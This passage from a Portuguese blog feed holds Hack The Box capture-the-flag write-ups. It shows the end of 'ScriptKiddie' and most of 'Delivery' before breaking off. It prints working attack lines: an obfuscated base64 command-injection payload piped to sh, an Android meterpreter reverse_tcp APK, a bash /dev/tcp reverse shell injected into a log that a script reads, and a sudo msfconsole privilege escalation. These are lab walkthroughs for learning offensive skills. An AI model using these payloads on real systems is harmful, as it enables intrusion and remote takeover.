&lt;span class=&quot;nt&quot;&gt;-dname&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'|echo -n Y20wZ0wzUnRjQzltTzIxclptbG1ieUF2ZEcxd0wyWTdZMkYwSUM5MGJYQXZabnd2WW1sdUwzTm9JQzFwSURJK0pqRjhibU1nTVRBdU1UQXVNVFF1TVRNMklEUTBORE1nUGk5MGJYQXZaZz09 | base64 -d | base64 -d | sh #

  adding: empty (stored 0%)
jar signed.

Warning:
The signer'&lt;/span&gt;s certificate is self-signed.
The SHA1 algorithm specified &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the &lt;span class=&quot;nt&quot;&gt;-digestalg&lt;/span&gt; option is considered a security risk. This algorithm will be disabled &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a future update.
The SHA1withRSA algorithm specified &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the &lt;span class=&quot;nt&quot;&gt;-sigalg&lt;/span&gt; option is considered a security risk. This algorithm will be disabled &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Done! apkfile is at /tmp/tmpt7qr4ner/evil.apk
Do: msfvenom &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; /tmp/tmpt7qr4ner/evil.apk &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; android/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127.0.0.1 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Após gerado o arquivo APK contendo o payload, executado um request no portal com os dados sugeridos no final da execução do script anterior, apontando para o LHOST 127.0.0.1 e selecionando o tipo de payload android, que deverá ser traduzido para o payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;android/meterpreter/reverse_tcp&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/hWgxfFw.png&quot; alt=&quot;Submiting the evil payload&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Após clicar no botão &lt;strong&gt;Generate&lt;/strong&gt;, um shell reverso foi retornado no listener inicializado previamente conforme especificado durante a criação do payload.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/VAYnB2r.png&quot; alt=&quot;reverse shell returned&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nesta mesma sessão obtida, com as credenciais em que o aplicativo se encontrava em execução, no caso o usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kid&lt;/code&gt;, foi possível obter a flag de usuário.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kid@scriptkiddie:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kid&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kid&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;kid&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
kid@scriptkiddie:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/kid/user.txt
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;Depois de executar o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linenum.sh&lt;/code&gt;, notado que existe outro usuário na máquina, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn&lt;/code&gt;, e que tínhamos direito de leitura em seu perfil de diretório, o qual continha um arquivo chamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scanloosers.sh&lt;/code&gt; com o seguinte conteúdo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/kid/logs/hackers

&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/pwn/
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f3-&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;ip&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
    &lt;/span&gt;sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nmap --top-ports 10 -oN recon/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.nmap &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null&quot;&lt;/span&gt; &amp;amp;
&lt;span class=&quot;k&quot;&gt;done

if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &amp;lt; &lt;span class=&quot;nv&quot;&gt;$log&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-gt&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Uma vez que este script lê o conteúdo de um arquivo localizado no perfil do usuário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kid&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/kid/logs/hackers&lt;/code&gt;), editado seu conteúdo com o valor abaixo, de modo que fosse possível injetar o código necessário para a obtenção de um novo shell reverso com a conta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn&lt;/code&gt;, que aparentemente executaria este script de forma recorrente.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;  ;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/4242 0&amp;gt;&amp;amp;1' #&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ~/logs/hackers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Após definir o novo listener e alterar o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hackers&lt;/code&gt;, um novo shell reverso foi retornado, desta vez com a conta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwn&lt;/code&gt; :smile:&lt;/p&gt;

&lt;p&gt;Enumerando novamente a máquina, desta vez a partir da conta deste novo usuário utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt;, notei que este user possuía direitos de execução do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; de modo privilegiado.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ao instanciar a console utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;, pude executar comandos normalmente utilizando o privilégio de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, podendo assim ler o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; e obter a flag final desta máquina&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pwn@scriptkiddie:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /opt/metasploit-framework-6.0.9/msfconsole &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;
msf6 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;id

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
msf6 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;: &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt

&amp;lt;redacted&amp;gt;
msf6 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Espero que tenham gostado!&lt;/p&gt;

&lt;p&gt;Nos vemos no próximo post :smiley:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-easy" /><category term="htb-linux" /><summary type="html">Olá pessoal! A máquina desta semana será ScriptKiddie, outra máquina Linux classificada como fácil do Hack The Box, criada por 0xdf.</summary></entry><entry><title type="html">Hackthebox write-up: Delivery</title><link href="https://davicruz.com/writeup/2021/05/htb-delivery/" rel="alternate" type="text/html" title="Hackthebox write-up: Delivery" /><published>2021-05-22T13:00:00-03:00</published><updated>2021-05-22T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/05/htb-delivery</id><content type="html" xml:base="https://davicruz.com/writeup/2021/05/htb-delivery/">&lt;p&gt;Olá pessoal!&lt;/p&gt;

&lt;p&gt;A máquina desta semana será &lt;strong&gt;Delivery&lt;/strong&gt;, outra máquina Linux classificada como fácil do &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;, criada por &lt;a href=&quot;https://app.hackthebox.eu/users/3769&quot;&gt;ippsec&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/7C0GCed.png&quot; alt=&quot;HTB Delivery&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A resolução desta máquina foi bem interessante, onde tive a oportunidade de aprender a crackear senhas utilizando variações de dicionários utilizando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt;, além de vários pivoteamentos, porém simples, até que chegássemos nas credenciais de user e logo após sua obtenção, root.&lt;/p&gt;

&lt;h2 id=&quot;enumeração&quot;&gt;Enumeração&lt;/h2&gt;

&lt;p&gt;Como de costume, iniciado com scan rápido do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para que possamos identificar os serviços publicados nesta máquina.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.222
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-20 17:01 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.222
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;32.54 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;80tcp---serviço-http&quot;&gt;80/TCP - Serviço HTTP&lt;/h3&gt;

&lt;p&gt;Acessando a página e inspecionando o código-fonte, identifiquei que existe um link para &lt;strong&gt;helpdesk.delivery.htb&lt;/strong&gt;. Adicionada entrada encontrada, assim como dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;delivery.htb&lt;/code&gt;, no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; da máquina para permitir o acesso aos websites publicados nesta máquina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/DFYYSkN.png&quot; alt=&quot;HTB Delivery - Website&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ao clicar no link &lt;em&gt;Contact us&lt;/em&gt;, a seguinte informação é exibida, informando que assim que tivermos um e-mail delivery.htb, poderemos acessar a plataforma &lt;strong&gt;MatterMost&lt;/strong&gt;, que, conforme links enumerados, funciona na porta TCP 8065.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;h2 id=&quot;contact-us&quot;&gt;CONTACT US&lt;/h2&gt;
  &lt;p&gt;For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you’ll be able to have access to our MatterMost server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Seguindo com a tentativa de conseguir um e-mail com o HelpDesk, aberto um ticket com conteúdo de mentira enquanto inspecionava as requisições via &lt;em&gt;BurpSuite&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Após concluída a abertura do ticket, recebida seguinte informação, algo que foi crucial para obter acesso ao MatterMost: um endereço de e-mail do domínio &lt;strong&gt;@delivery.htb&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/Zh6GeDh.png&quot; alt=&quot;HTB Delivery - Helpdesk Website&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Acessando a plataforma do Mattermost criado uma conta e informado o e-mail recém obtido. Desta forma, caso precisemos receber alguma validação do serviço, os dados estarão disponíveis como comentários no ticket que acabamos de abrir :smile:.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6zMqj4N.png&quot; alt=&quot;HTB Delivery - Mattermost&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como esperado, ao verificar o status do ticket criado, comprovamos que nos comentários tínhamos um e-mail de confirmação do Mattermost, enviado para &lt;strong&gt;8024065@delivery.htb&lt;/strong&gt;, onde pudemos obter o link de verificação para o serviço.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/TLIBKIn.png&quot; alt=&quot;HTB Delivery - Email comment&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Após verificada a conta, pudemos acessar o portal com as credenciais previamente utilizadas e obter acesso a um time chamado &lt;strong&gt;Internal&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/qN2YraR.png&quot; alt=&quot;HTB Delivery - Mattermost - Account Confirmed&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentre as mensagens neste time, algumas chamaram atenção, que continham informações importantes para a resolução desta máquina:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Credenciais para o osTicket são &lt;strong&gt;maildeliverer:Youve_G0t_Mail!&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Desenvolvedores utilizavam com frequência &lt;em&gt;variações de &lt;strong&gt;PleaseSubscribe!&lt;/strong&gt;&lt;/em&gt; e deveriam deixar de fazê-lo.
    &lt;ul&gt;
      &lt;li&gt;Estas variações poderiam ser facilmente craqueadas utilizando &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt; rules&lt;/strong&gt;, que foi uma dica bastante valiosa em como quebrar a senha de root ou algo em seu caminho.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/8KP9NRl.png&quot; alt=&quot;HTB Delivery - Mattermost Internal Channel&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Buscando a página de administração do osTicket, fiz logoff da conta &lt;em&gt;Guest User&lt;/em&gt;, do lado esquerdo superior e, durante o processo de sign-in, selecionei a opção &lt;strong&gt;I’m an agent - sign in here&lt;/strong&gt;, que me levou à URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://helpdesk.delivery.htb/scp/login.php&lt;/code&gt;, de onde é feita a administração dos incidentes gerados na plataforma.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/JsI5fmb.png&quot; alt=&quot;HTB Delivery - OsTicket Admin Portal&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ao acessá-la com as credenciais do usuário &lt;strong&gt;maildeliverer&lt;/strong&gt;, pude confirmar acesso ao serviço e validar a versão em execução do osTicket, que é a &lt;strong&gt;1.15.1&lt;/strong&gt;, onde vamos buscar um acesso inicial a partir de alguma vulnerabilidade ou funcionalidade existente na plataforma.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/vYiQjKN.png&quot; alt=&quot;HTB Delivery - OsTicket Version&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Navegando pela console, encontrei uma API, onde menciona a execução de tarefas usando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cron&lt;/code&gt;, que poderia eventualmente ser utilizado pra algum acesso inicial na máquina. Vendo a documentação encontrei &lt;a href=&quot;https://docs.osticket.com/en/latest/Developer%20Documentation/API/Tasks.html?highlight=cron&quot;&gt;este link&lt;/a&gt; que menciona o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scripts\rcron.php&lt;/code&gt; o qual é utilizado para manipular as chamadas.&lt;/p&gt;

&lt;p&gt;Segui então com a criação de uma API key para o endereço IP da minha máquina e baixei o script &lt;a href=&quot;https://raw.githubusercontent.com/osTicket/osTicket/1.15.x/setup/scripts/rcron.php&quot;&gt;deste link&lt;/a&gt; para inspecionar a execução, &lt;strong&gt;porém em nada disso obtive o sucesso esperado&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;acesso-inicial-e-user-flag&quot;&gt;Acesso inicial e User flag&lt;/h2&gt;

&lt;p&gt;Embora tenha analisado algumas possibilidades via osTicket API, acabei voltando atrás e pensando simples, me perguntando: Será que a conta &lt;strong&gt;maildeliverer&lt;/strong&gt; é um usuário desta máquina? Ao tentar conectar via SSH usando as mesmas credenciais do osTicket consegui o acesso inicial com esta conta :man_facepalming:. De quebra, dentro do diretório deste usuário havia o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; o qual permitiu a leitura da flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh maildeliverer@10.10.10.222                                                                                                 
The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.10.222 (10.10.10.222)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '&lt;/span&gt;10.10.10.222&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
maildeliverer@10.10.10.222'&lt;/span&gt;s password:
Linux Delivery 4.19.0-13-amd64 &lt;span class=&quot;c&quot;&gt;#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64&lt;/span&gt;

The programs included with the Debian GNU/Linux system are free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.10.10
maildeliverer@Delivery:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 28
drwxr-xr-x 3 maildeliverer maildeliverer 4096 Jan  3 23:12 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root          root          4096 Dec 26 09:01 ..
lrwxrwxrwx 1 root          root             9 Dec 28 07:04 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 maildeliverer maildeliverer  220 Dec 26 09:01 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 maildeliverer maildeliverer 3526 Dec 26 09:01 .bashrc
drwx------ 3 maildeliverer maildeliverer 4096 Dec 28 06:58 .gnupg
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 maildeliverer maildeliverer  807 Dec 26 09:01 .profile
&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt; 1 maildeliverer maildeliverer   33 Feb 24 06:58 user.txt
maildeliverer@Delivery:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;Iniciado com a execução do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; para que pudesse realizar a enumeração mais rapidamente, onde os seguintes pontos chamaram atenção:&lt;/p&gt;

&lt;ul&gt;
